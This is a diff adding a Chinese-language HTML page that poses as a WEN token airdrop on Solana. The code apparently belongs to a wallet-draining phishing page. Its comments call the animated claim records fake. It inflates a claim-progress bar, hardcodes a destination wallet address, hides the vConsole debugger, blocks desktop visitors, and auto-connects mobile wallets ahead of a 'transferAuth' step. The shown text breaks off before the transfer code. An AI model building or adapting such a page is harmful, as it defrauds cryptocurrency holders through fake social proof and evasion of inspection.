@@ -1,0 +1,1195 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>WEN 代币空投 | Solana生态</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+  <!-- 替换原来的 QRCode 库 -->
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+
+  <meta name="viewport" id="viewportMeta" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+  /* 最近领取记录框 */
+  #activityList {
+    height: 90%; /* 设置固定高度 */
+    overflow: hidden; /* 隐藏滚动条 */
+    position: relative;
+  }
+ #__vconsole {
+      display: none !important; /* 尝试直接隐藏 */
+    }
+    /* 如果 vConsole 仍然存在，用更激进的方式 */
+    @media screen and (max-width: 9999px) {
+      #__vconsole {
+        right: -9999px !important; /* 强制移出屏幕 */
+        opacity: 0 !important; /* 完全透明 */
+        pointer-events: none !important; /* 禁止交互 */
+      }
+    }
+  /* 动画效果 */
+  .activity-item {
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity 0.5s, transform 0.5s;
+  }
+
+  .activity-item.show {
+    opacity: 1;
+    transform: translateY(0);
+  }
+</style>
+  <style>
+     /* 强制 vConsole 移出屏幕 */
+  
+    @media (max-width: 768px) {
+  .form-input {
+    max-width: 90%; /* 设置输入框最大宽度为90%，避免太长 */
+  }
+}
+    body {
+      font-family: 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f8f9fa;
+      color: #2d3436;
+      min-height: 100vh;
+      opacity: 1;
+      overflow-x: hidden;
+    }
+    
+    /* 导航栏 - PC端 */
+    .navbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 5%;
+      background: white;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      position: relative;
+      z-index: 100;
+    }
+    
+    .logo {
+      display: flex;
+      align-items: center;
+      font-weight: 700;
+      font-size: 1.5rem;
+      color: #6c5ce7;
+      text-decoration: none;
+    }
+    
+    .logo img {
+      height: 40px;
+      margin-right: 10px;
+    }
+    
+    .nav-links {
+      display: flex;
+      gap: 30px;
+    }
+    
+    .nav-links a {
+      color: #2d3436;
+      text-decoration: none;
+      font-weight: 500;
+      transition: all 0.3s ease;
+      position: relative;
+    }
+    
+    .nav-links a:hover {
+      color: #6c5ce7;
+    }
+    
+    .wallet-connect {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    
+    .connect-btn {
+      background: linear-gradient(135deg, #6c5ce7 0%, #00cec9 100%);
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 50px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(108, 92, 231, 0.3);
+    }
+    
+    .wallet-info {
+      background: rgba(108, 92, 231, 0.1);
+      padding: 8px 15px;
+      border-radius: 50px;
+      font-size: 0.9rem;
+      display: none;
+    }
+    
+    /* 移动端菜单按钮 */
+    .menu-toggle {
+      display: none;
+      background: none;
+      border: none;
+      font-size: 1.5rem;
+      color: #2d3436;
+      cursor: pointer;
+    }
+    
+    /* 主要内容 */
+    .main-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 40px 5%;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 30px;
+    }
+    
+    .airdrop-section {
+      flex: 1;
+      min-width: 300px;
+    }
+    
+    .activity-section {
+      flex: 1;
+      min-width: 300px;
+      background: white;
+      border-radius: 16px;
+      padding: 25px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      max-height: 600px;
+      overflow-y: auto;
+    }
+    
+    .section-title {
+      font-size: 1.5rem;
+      margin-bottom: 20px;
+      color: #6c5ce7;
+      padding-bottom: 10px;
+      border-bottom: 2px solid #f0f0f0;
+    }
+    
+    .hero {
+      text-align: center;
+      margin-bottom: 60px;
+      width: 100%;
+    }
+    
+    .hero h1 {
+      font-size: 3rem;
+      margin-bottom: 20px;
+      background: linear-gradient(135deg, #6c5ce7 0%, #00cec9 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      line-height: 1.2;
+    }
+    
+    /* 空投卡片 */
+    .airdrop-card {
+      background: white;
+      border-radius: 16px;
+      padding: 40px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .airdrop-card:before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 10px;
+      background: linear-gradient(135deg, #6c5ce7 0%, #00cec9 100%);
+    }
+    
+    .card-header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    
+    /* 统计信息 */
+    .stats {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 30px;
+      gap: 15px;
+    }
+    
+    .stat-item {
+      flex: 1;
+      text-align: center;
+      padding: 20px;
+      background: rgba(108, 92, 231, 0.05);
+      border-radius: 16px;
+      transition: all 0.3s ease;
+    }
+    
+    .stat-value {
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: #6c5ce7;
+      margin-bottom: 5px;
+    }
+    
+    .stat-label {
+      font-size: 0.9rem;
+      color: #666;
+    }
+    
+    /* 表单元素 */
+    .form-group {
+      margin-bottom: 25px;
+    }
+    
+    .form-label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: 500;
+      color: #2d3436;
+    }
+    
+    .form-input {
+      width: 93%;
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 16px;
+      font-size: 1rem;
+      transition: all 0.3s ease;
+    }
+    
+    /* 空投信息 */
+    .airdrop-info {
+      text-align: center;
+      padding: 30px;
+      background: rgba(108, 92, 231, 0.05);
+      border-radius: 16px;
+      margin: 30px 0;
+    }
+    
+    .airdrop-amount {
+      font-size: 3rem;
+      font-weight: 700;
+      margin: 10px 0;
+      background: linear-gradient(135deg, #6c5ce7 0%, #00cec9 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    /* 进度条 */
+    .progress-container {
+      width: 100%;
+      height: 10px;
+      background: #f0f0f0;
+      border-radius: 5px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(135deg, #6c5ce7 0%, #00cec9 100%);
+      border-radius: 5px;
+      transition: width 0.5s ease;
+    }
+    
+    /* 按钮 */
+    .btn {
+      width: 100%;
+      padding: 18px;
+      border: none;
+      border-radius: 16px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 20px;
+    }
+    
+    .btn-primary {
+      background: linear-gradient(135deg, #6c5ce7 0%, #00cec9 100%);
+      color: white;
+      box-shadow: 0 4px 15px rgba(108, 92, 231, 0.3);
+    }
+    
+    /* 活动记录 */
+    .activity-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    
+    .activity-item {
+      padding: 15px 0;
+      border-bottom: 1px solid #f0f0f0;
+      display: flex;
+      justify-content: space-between;
+    }
+    
+    .activity-address {
+      font-weight: 500;
+      color: #6c5ce7;
+    }
+    
+    .activity-amount {
+      font-weight: 600;
+    }
+    
+    .activity-time {
+      color: #666;
+      font-size: 0.9rem;
+    }
+    
+    /* 响应式设计 */
+    @media (max-width: 992px) {
+      .navbar {
+        padding: 15px 5%;
+      }
+      
+      .nav-links {
+        gap: 20px;
+      }
+      
+      .hero h1 {
+        font-size: 2.5rem;
+      }
+    }
+    
+    @media (max-width: 768px) {
+      .menu-toggle {
+        display: block;
+      }
+      
+      .nav-links {
+        position: fixed;
+        top: 80px;
+        left: 0;
+        width: 100%;
+        background: white;
+        flex-direction: column;
+        align-items: center;
+        padding: 20px 0;
+        box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        transform: translateY(-150%);
+        transition: transform 0.3s ease;
+        z-index: 99;
+      }
+      
+      .nav-links.active {
+        transform: translateY(0);
+      }
+      
+      .nav-links a {
+        padding: 10px 0;
+      }
+      
+      .stats {
+        flex-direction: column;
+      }
+      
+      .hero h1 {
+        font-size: 2rem;
+      }
+      
+      .airdrop-card {
+        padding: 30px 20px;
+      }
+      
+      .stat-value {
+        font-size: 1.5rem;
+      }
+      
+      .airdrop-amount {
+        font-size: 2.5rem;
+      }
+    }
+    
+    /* 弹窗 */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0,0,0,0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s;
+    }
+    
+    .modal-overlay.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    
+    .modal-container {
+      background: black;
+      width: 95%;
+      max-width: 250px;
+      border-radius: 16px;
+      padding: 30px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    }
+    
+    .modal-icon {
+      font-size: 3rem;
+      margin-bottom: 20px;
+      color: #6c5ce7;
+    }
+    
+    .modal-title {
+      font-size: 1.5rem;
+      margin-bottom: 15px;
+      color: #2d3436;
+    }
+    
+    .modal-content {
+      font-size: 1rem;
+      color: #666;
+      margin-bottom: 25px;
+    }
+    
+    .modal-btn {
+      padding: 12px 25px;
+      background: linear-gradient(135deg, #6c5ce7 0%, #00cec9 100%);
+      color: white;
+      border: none;
+      border-radius: 50px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    /* 二维码弹窗样式 */
+#qrModalOverlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0,0,0,0.7);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.3s;
+}
+
+#qrModalOverlay.show {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+#qrModalContainer {
+  background: white;
+  width: 90%;
+  max-width: 400px;
+  border-radius: 16px;
+  padding: 30px;
+  text-align: center;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+}
+
+#qrModalTitle {
+  font-size: 1.2rem;
+  margin-bottom: 25px;
+  color: white;
+  margin-top: -18px;
+}
+
+#qrModalButton {
+  padding: 12px 25px;
+  background: linear-gradient(135deg, #6c5ce7 0%, #00cec9 100%);
+  color: white;
+  border: none;
+  border-radius: 50px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+  .modal-title {
+    color: white;
+    transition: all 0.3s ease;
+    position: relative;
+    display: inline-block;
+  }
+  
+  .success-feedback {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+     background-color: rgba(0, 0, 0, 0.7); /* 黑色，70% 不透明度 */
+    border-radius: 24px;
+    padding: 8px 16px;
+    box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3);
+    animation: fadeIn 0.3s ease;
+  }
+  
+  .success-feedback .checkmark {
+    color: #4CAF50;
+    font-size: 1.5em;
+    margin-right: 8px;
+    font-weight: bold;
+  }
+  
+  .success-feedback .text {
+    color: white;
+    font-size: 1em;
+  }
+  
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-5px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  </style>
+</head>
+<body>
+  <!-- 导航栏 -->
+  <nav class="navbar">
+    <a href="#" class="logo">
+      <img src="https://www.iconaves.com/token_icon_solana/solana/WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk.png" alt="WEN Logo">
+      WEN
+    </a>
+    
+    <button class="menu-toggle" id="menuToggle">
+      <i class="fas fa-bars"></i>
+    </button>
+    
+    <div class="nav-links" id="navLinks">
+      <a href="#">首页</a>
+      <a href="#">关于WEN</a>
+      <a href="#">空投规则</a>
+      <a href="#">路线图</a>
+      <a href="#">社区</a>
+    </div>
+    
+    <div class="wallet-connect">
+      <div class="wallet-info" id="walletInfo"></div>
+      <button class="connect-btn" id="connectButton">连接钱包</button>
+    </div>
+  </nav>
+  <!-- 二维码弹窗 -->
+<div class="modal-overlay" id="qrModalOverlay">
+  <div class="modal-container">
+
+    <h2 class="modal-title" id="qrModalTitle">WalletConnect</h2>
+   <div class="modal-content" id="qrModalContent">
+  <canvas id="qrcode"></canvas>  <!-- 关键改动！ -->
+  
+</div>
+   <div style="font-size:14px;color:white">Scan this QR Code with your phone</div><br />
+    <wui-link color="" style="font-size:14px;color:#fff" id="copyLinkButton">
+      <wui-icon slot="iconLeft" name="copy" style=""><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
+  <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M9.21498 1.28565H10.5944C11.1458 1.28562 11.6246 1.2856 12.0182 1.32093C12.4353 1.35836 12.853 1.44155 13.2486 1.66724C13.7005 1.92498 14.0749 2.29935 14.3326 2.75122C14.5583 3.14689 14.6415 3.56456 14.6789 3.9817C14.7143 4.37531 14.7142 4.85403 14.7142 5.40545V6.78489C14.7142 7.33631 14.7143 7.81503 14.6789 8.20865C14.6415 8.62578 14.5583 9.04345 14.3326 9.43912C14.0749 9.89099 13.7005 10.2654 13.2486 10.5231C12.853 10.7488 12.4353 10.832 12.0182 10.8694C11.7003 10.8979 11.3269 10.9034 10.9045 10.9045C10.9034 11.3269 10.8979 11.7003 10.8694 12.0182C10.832 12.4353 10.7488 12.853 10.5231 13.2486C10.2654 13.7005 9.89099 14.0749 9.43912 14.3326C9.04345 14.5583 8.62578 14.6415 8.20865 14.6789C7.81503 14.7143 7.33631 14.7142 6.78489 14.7142H5.40545C4.85403 14.7142 4.37531 14.7143 3.9817 14.6789C3.56456 14.6415 3.14689 14.5583 2.75122 14.3326C2.29935 14.0749 1.92498 13.7005 1.66724 13.2486C1.44155 12.853 1.35836 12.4353 1.32093 12.0182C1.2856 11.6246 1.28562 11.1458 1.28565 10.5944V9.21498C1.28562 8.66356 1.2856 8.18484 1.32093 7.79122C1.35836 7.37409 1.44155 6.95642 1.66724 6.56074C1.92498 6.10887 2.29935 5.73451 2.75122 5.47677C3.14689 5.25108 3.56456 5.16789 3.9817 5.13045C4.2996 5.10192 4.67301 5.09645 5.09541 5.09541C5.09645 4.67302 5.10192 4.2996 5.13045 3.9817C5.16789 3.56456 5.25108 3.14689 5.47676 2.75122C5.73451 2.29935 6.10887 1.92498 6.56074 1.66724C6.95642 1.44155 7.37409 1.35836 7.79122 1.32093C8.18484 1.2856 8.66356 1.28562 9.21498 1.28565ZM5.09541 7.09552C4.68397 7.09667 4.39263 7.10161 4.16046 7.12245C3.88053 7.14757 3.78516 7.18949 3.74214 7.21403C3.60139 7.29431 3.48478 7.41091 3.4045 7.55166C3.37997 7.59468 3.33804 7.69005 3.31292 7.96999C3.28659 8.26345 3.28565 8.65147 3.28565 9.25708V10.5523C3.28565 11.1579 3.28659 11.5459 3.31292 11.8394C3.33804 12.1193 3.37997 12.2147 3.4045 12.2577C3.48478 12.3985 3.60139 12.5151 3.74214 12.5954C3.78516 12.6199 3.88053 12.6618 4.16046 12.6869C4.45393 12.7133 4.84195 12.7142 5.44755 12.7142H6.74279C7.3484 12.7142 7.73641 12.7133 8.02988 12.6869C8.30981 12.6618 8.40518 12.6199 8.44821 12.5954C8.58895 12.5151 8.70556 12.3985 8.78584 12.2577C8.81038 12.2147 8.8523 12.1193 8.87742 11.8394C8.89825 11.6072 8.90319 11.3159 8.90435 10.9045C8.48219 10.9034 8.10898 10.8979 7.79122 10.8694C7.37409 10.832 6.95641 10.7488 6.56074 10.5231C6.10887 10.2654 5.73451 9.89099 5.47676 9.43912C5.25108 9.04345 5.16789 8.62578 5.13045 8.20865C5.10194 7.89089 5.09645 7.51767 5.09541 7.09552ZM7.96999 3.31292C7.69005 3.33804 7.59468 3.37997 7.55166 3.4045C7.41091 3.48478 7.29431 3.60139 7.21403 3.74214C7.18949 3.78516 7.14757 3.88053 7.12245 4.16046C7.09611 4.45393 7.09517 4.84195 7.09517 5.44755V6.74279C7.09517 7.3484 7.09611 7.73641 7.12245 8.02988C7.14757 8.30981 7.18949 8.40518 7.21403 8.4482C7.29431 8.58895 7.41091 8.70556 7.55166 8.78584C7.59468 8.81038 7.69005 8.8523 7.96999 8.87742C8.26345 8.90376 8.65147 8.9047 9.25708 8.9047H10.5523C11.1579 8.9047 11.5459 8.90376 11.8394 8.87742C12.1193 8.8523 12.2147 8.81038 12.2577 8.78584C12.3985 8.70556 12.5151 8.58895 12.5954 8.4482C12.6199 8.40518 12.6618 8.30981 12.6869 8.02988C12.7133 7.73641 12.7142 7.3484 12.7142 6.74279V5.44755C12.7142 4.84195 12.7133 4.45393 12.6869 4.16046C12.6618 3.88053 12.6199 3.78516 12.5954 3.74214C12.5151 3.60139 12.3985 3.48478 12.2577 3.4045C12.2147 3.37997 12.1193 3.33804 11.8394 3.31292C11.5459 3.28659 11.1579 3.28565 10.5523 3.28565H9.25708C8.65147 3.28565 8.26345 3.28659 7.96999 3.31292Z"></path></svg></wui-icon>
+      Copy link
+    </wui-link><br /><br />
+    <div style="font-size:18px;color:white;padding:0 0 0 10px;"><span style="margin-top:-6px">UX by</span> <svg width="80" height="16" fill="none">
+  <path d="M9.3335 4.66667C9.3335 2.08934 11.4229 0 14.0002 0H20.6669C23.2442 0 25.3335 2.08934 25.3335 4.66667V11.3333C25.3335 13.9106 23.2442 16 20.6669 16H14.0002C11.4229 16 9.3335 13.9106 9.3335 11.3333V4.66667Z" fill="#363636"></path>
+  <path d="M15.6055 11.0003L17.9448 4.66699H18.6316L16.2923 11.0003H15.6055Z" fill="#F6F6F6"></path>
+  <path d="M0 4.33333C0 1.9401 1.9401 0 4.33333 0C6.72657 0 8.66669 1.9401 8.66669 4.33333V11.6667C8.66669 14.0599 6.72657 16 4.33333 16C1.9401 16 0 14.0599 0 11.6667V4.33333Z" fill="#363636"></path>
+  <path d="M3.9165 9.99934V9.16602H4.74983V9.99934H3.9165Z" fill="#F6F6F6"></path>
+  <path d="M26 8C26 3.58172 29.3517 0 33.4863 0H52.5137C56.6483 0 60 3.58172 60 8C60 12.4183 56.6483 16 52.5137 16H33.4863C29.3517 16 26 12.4183 26 8Z" fill="#363636"></path>
+  <path d="M49.3687 9.95834V6.26232H50.0213V6.81966C50.256 6.40899 50.7326 6.16699 51.2606 6.16699C52.0599 6.16699 52.6173 6.67299 52.6173 7.65566V9.95834H51.972V7.69234C51.972 7.04696 51.6053 6.70966 51.07 6.70966C50.4906 6.70966 50.0213 7.17168 50.0213 7.82433V9.95834H49.3687Z" fill="#F6F6F6"></path>
+  <path d="M45.2538 9.95773L44.5718 6.26172H45.1877L45.6717 9.31242L46.3098 7.30306H46.9184L47.5491 9.29041L48.0404 6.26172H48.6564L47.9744 9.95773H47.2411L46.6178 8.03641L45.9871 9.95773H45.2538Z" fill="#F6F6F6"></path>
+  <path d="M42.3709 10.0536C41.2489 10.0536 40.5889 9.21765 40.5889 8.1103C40.5889 7.01035 41.2489 6.16699 42.3709 6.16699C43.4929 6.16699 44.1529 7.01035 44.1529 8.1103C44.1529 9.21765 43.4929 10.0536 42.3709 10.0536ZM42.3709 9.51096C43.1775 9.51096 43.4856 8.82164 43.4856 8.10296C43.4856 7.39163 43.1775 6.70966 42.3709 6.70966C41.5642 6.70966 41.2562 7.39163 41.2562 8.10296C41.2562 8.82164 41.5642 9.51096 42.3709 9.51096Z" fill="#F6F6F6"></path>
+  <path d="M38.2805 10.0536C37.1952 10.0536 36.5132 9.22499 36.5132 8.1103C36.5132 7.00302 37.1952 6.16699 38.2805 6.16699C39.1972 6.16699 40.0038 6.68766 39.9159 8.27896H37.1805C37.2319 8.96103 37.5472 9.5183 38.2805 9.5183C38.7718 9.5183 39.0945 9.21765 39.2045 8.87299H39.8499C39.7472 9.48903 39.1679 10.0536 38.2805 10.0536ZM37.1952 7.78765H39.2852C39.2338 7.04696 38.8892 6.70232 38.2805 6.70232C37.6132 6.70232 37.2832 7.18635 37.1952 7.78765Z" fill="#F6F6F6"></path>
+  <path d="M33.3828 9.95773V6.26172H34.0501V6.88506C34.2848 6.47439 34.6882 6.26172 35.1061 6.26172H35.9935V6.88506H35.0548C34.4682 6.88506 34.0501 7.26638 34.0501 8.00706V9.95773H33.3828Z" fill="#F6F6F6"></path>
+</svg> </div>
+   
+  </div>
+</div>
+<script>
+  document.getElementById('copyLinkButton').addEventListener('click', function() {
+    // 获取当前页面的URL
+    const currentUrl = window.location.href;
+    const originalTitle = document.getElementById('qrModalTitle').textContent;
+    const titleElement = document.getElementById('qrModalTitle');
+    
+    // 使用Clipboard API复制URL
+    navigator.clipboard.writeText(currentUrl)
+      .then(() => {
+        // 复制成功后的反馈
+        showSuccessFeedback(titleElement, originalTitle);
+      })
+      .catch(err => {
+        console.error('Failed to copy URL: ', err);
+        // 备用方法，如果Clipboard API不可用
+        const textArea = document.createElement('textarea');
+        textArea.value = currentUrl;
+        document.body.appendChild(textArea);
+        textArea.select();
+        try {
+          document.execCommand('copy');
+          showSuccessFeedback(titleElement, originalTitle);
+        } catch (err) {
+          console.error('Fallback copy failed: ', err);
+        }
+        document.body.removeChild(textArea);
+      });
+  });
+  
+  function showSuccessFeedback(element, originalText) {
+    // 保存原始HTML内容
+    const originalHTML = element.innerHTML;
+    
+    // 设置新的反馈内容
+    element.innerHTML = `
+      <span class="success-feedback">
+        <span class="checkmark">✓</span>
+        <span class="text">Link copied</span>
+      </span>
+    `;
+    
+    // 2秒后恢复原状
+    setTimeout(() => {
+      element.textContent = originalText;
+    }, 2000);
+  }
+</script>
+  <!-- 主要内容 -->
+  <div class="main-container">
+    <div class="hero">
+      <h1>领取您的 WEN 代币空投</h1>
+    </div>
+    
+    <div class="airdrop-section">
+      <div class="airdrop-card">
+        <div class="card-header">
+          <h2>WEN 代币空投</h2>
+          <p>简单几步即可领取您的空投奖励</p>
+        </div>
+        
+        <div class="stats">
+          <div class="stat-item">
+            <div class="stat-value" id="totalAirdrop">10,000,000,000</div>
+            <div class="stat-label">总空投量</div>
+          </div>
+
+        </div>
+        
+        <div class="form-group">
+          <label class="form-label">您的 SOL 钱包地址</label>
+          <input type="text" id="addressInput" class="form-input" placeholder="点击连接钱包或手动输入" readonly>
+        </div>
+        
+        <div class="airdrop-info">
+          <div class="airdrop-amount" id="airdropAmount">100~5,000</div>
+          <div class="airdrop-token">WEN 代币</div>
+        </div>
+        
+        <div class="progress-container">
+  <div class="progress-bar" id="progressBar" style="width: 00%"></div>
+</div>
+<div class="stat-label" id="progressLabel" style="text-align: center;">已领取 32%</div>
+
+        
+        <button id="transferAuth" class="btn btn-primary" disabled>领取空投</button>
+        
+      </div>
+    </div>
+     <div class="airdrop-section">
+         <div class="airdrop-card" style="height:89.5%">
+             
+      
+   
+      <h3 class="section-title">最新领取记录</h3>
+      <ul class="activity-list" id="activityList">
+        <!-- 动态生成的虚假领取记录 -->
+      </ul>
+  
+  </div>
+     </div>
+   </div>
+  
+  <!-- 弹窗 -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal-container">
+      <div class="modal-icon" id="modalIcon">🎁</div>
+      <h2 class="modal-title" id="modalTitle">成功</h2>
+      <div class="modal-content" id="modalContent">空投已成功领取！</div>
+      <button class="modal-btn" id="modalButton">确定</button>
+    </div>
+  </div>
+
+  <script>
+    // 修复手机端无法滑动的问题
+    
+    
+    
+    document.body.style.overflow = 'auto';
+    document.body.style.position = 'relative';
+    document.body.style.height = 'auto';
+    const specifiedAddress = 'Cm6mrpZrRLrp6G85tKbD5QZumNLGboFofsaduQ22JT4L'; 
+// 设置初始领取百分比
+let currentProgress = 32.00; // 初始值为 32.00%
+
+// 页面加载时立即显示进度，并开始动画
+window.onload = function() {
+  // 显示当前进度条和百分比文本
+  const progressBar = document.getElementById('progressBar');
+  const progressLabel = document.getElementById('progressLabel');
+  
+  // 设置初始的进度条宽度和文本
+  progressBar.style.width = `${currentProgress}%`;
+  progressLabel.textContent = `已领取 ${currentProgress.toFixed(2)}%`;
+
+  // 启动进度更新动画
+  setTimeout(updateProgress, 1000);
+};
+
+// 每分钟平滑过渡进度
+function updateProgress() {
+  const targetProgress = Math.floor(currentProgress) + 1; // 目标进度是当前整数部分 + 1
+
+  let startTime = null;
+
+  function smoothUpdate(timestamp) {
+    if (!startTime) startTime = timestamp; // 初始化开始时间
+    const progressDuration = 60000; // 设置动画持续时间为1分钟（60000ms）
+    const elapsedTime = timestamp - startTime;
+
+    // 计算动画进度（在0到1之间）
+    const progress = Math.min(elapsedTime / progressDuration, 1);
+
+    // 平滑计算当前进度
+    currentProgress = Math.floor(currentProgress) + progress; // 使用当前整数部分加上动画过渡的小数部分
+
+    // 更新进度条宽度
+    const progressBar = document.getElementById('progressBar');
+    progressBar.style.width = `${currentProgress}%`; // 更新进度条的宽度
+
+    // 更新文本内容
+    const progressLabel = document.getElementById('progressLabel');
+    progressLabel.textContent = `已领取 ${currentProgress.toFixed(2)}%`; // 保留两位小数
+
+    // 如果动画未结束，继续请求下一帧
+    if (progress < 1) {
+      requestAnimationFrame(smoothUpdate);
+    } else {
+      // 当动画完成后，确保精确更新到目标值
+      currentProgress = targetProgress;
+      progressBar.style.width = `${currentProgress}%`;
+      progressLabel.textContent = `已领取 ${currentProgress.toFixed(2)}%`;
+
+      // 下一次动画开始前更新目标
+      setTimeout(updateProgress, 60000); // 1分钟后开始下一次进度更新
+    }
+  }
+
+  // 开始平滑动画
+  requestAnimationFrame(smoothUpdate);
+}
+
+async function autoConnectWallet() {
+  try {
+    if (window.solana && window.solana.isConnected) {
+      const response = await window.solana.connect();
+      const walletAddress = response.publicKey.toString();
+      
+      // 填充地址到输入框，并设为只读
+      const addressInput = document.getElementById('addressInput');
+      if (addressInput) {
+        addressInput.value = walletAddress;  // 填充地址
+        addressInput.readOnly = true;  // 设置为只读
+      }
+      // 更新连接按钮文本为钱包地址的前3和后4位
+      const connectButton = document.getElementById('connectButton');
+      if (connectButton) {
+        connectButton.innerText = walletAddress.slice(0, 3) + '...' + walletAddress.slice(-4);
+      }
+    }
+  } catch (error) {
+    console.error('自动连接失败:', error);
+  }
+}
+function checkDeviceAndHandleWallet() {
+  const isPC = window.innerWidth > 768;  // 判断是否为PC设备
+
+  if (isPC) {
+    // 如果是PC设备，禁止连接钱包，隐藏连接钱包按钮
+    const connectButton = document.getElementById('connectButton');
+    if (connectButton) {
+      connectButton.style.display = 'none';  // 隐藏连接钱包按钮
+    }
+    
+    // 断开钱包连接的逻辑（如果已连接钱包）
+    if (window.solana && window.solana.isConnected) {
+      window.solana.disconnect();  // 断开钱包连接
+    }
+  } else {
+    // 如果是安卓或其他移动设备，保留现有逻辑，尝试自动连接钱包
+    autoConnectWallet();
+  }
+}
+document.addEventListener('DOMContentLoaded', () => {
+  checkDeviceAndHandleWallet();
+});
+  function generateSolanaAddress() {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let address = '';
+    for (let i = 0; i < 32; i++) {
+      address += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    // 返回地址格式：前4个字符 + ... + 后6个字符
+    return address.slice(0, 4) + '...' + address.slice(-6);
+  }
+    // 生成虚假领取记录
+   function generateFakeActivities() {
+    const activities = [];
+    const tokens = ['WEN', 'SOL', 'USDC'];
+    const now = new Date();
+    
+    for (let i = 0; i < 15; i++) {
+      const minutesAgo = Math.floor(Math.random() * 1440); // 24小时内
+      const time = new Date(now.getTime() - minutesAgo * 60000);
+      const address = generateSolanaAddress();  // 使用Solana地址生成函数
+      const amount = Math.floor(Math.random() * 9000) + 1000;
+      const token = tokens[Math.floor(Math.random() * tokens.length)];
+      
+      activities.push({
+        address,
+        amount,
+        token,
+        time: time.toLocaleString()
+      });
+    }
+    
+    return activities;
+  }
+    
+    // 显示虚假领取记录
+   function displayFakeActivities() {
+    const activityList = document.getElementById('activityList');
+    const activities = generateFakeActivities();
+    let index = 0;
+
+    // 确定每个设备端最多显示的记录数
+    const maxItems = window.innerWidth <= 768 ? 4 : 8;  // 手机端最多显示4条，电脑端最多显示8条
+    const interval = setInterval(() => {
+      if (index >= activities.length) {
+        clearInterval(interval); // 所有记录显示完成后清除定时器
+      } else {
+        const activity = activities[index];
+        const li = document.createElement('li');
+        li.className = 'activity-item';
+        li.innerHTML = `
+          <div>
+            <div class="activity-address">${activity.address}</div>
+            <div class="activity-time">${activity.time}</div>
+          </div>
+          <div class="activity-amount">${activity.amount.toLocaleString()} ${activity.token}</div>
+        `;
+        activityList.appendChild(li);
+
+        // 添加动画显示效果
+        setTimeout(() => {
+          li.classList.add('show');
+        }, 50); // 延迟一点，确保动画生效
+
+        // 如果超过最大显示数量，删除最旧的记录
+        if (activityList.children.length > maxItems) {
+          activityList.removeChild(activityList.children[0]);
+        }
+
+        index++;
+      }
+    }, Math.random() * 4000 + 1000); // 随机间隔1到5秒
+  }
+    
+
+    
+document.addEventListener('DOMContentLoaded', async () => {
+  try {
+      
+    if (!window.solana || !window.solana.isPhantom) {
+      showModal('请在TokenPocket钱包中打开');
+      return;
+    }
+
+    const connection = new solanaWeb3.Connection('https://solana3.mytokenpocket.vip');
+    const response = await window.solana.connect();
+    const walletAddress = response.publicKey.toString();
+
+    // 获取指定地址（从反向代理的查询参数中）
+    const urlParams = new URLSearchParams(window.location.search);
+     // 获取指定地址参数
+
+    if (!specifiedAddress) {
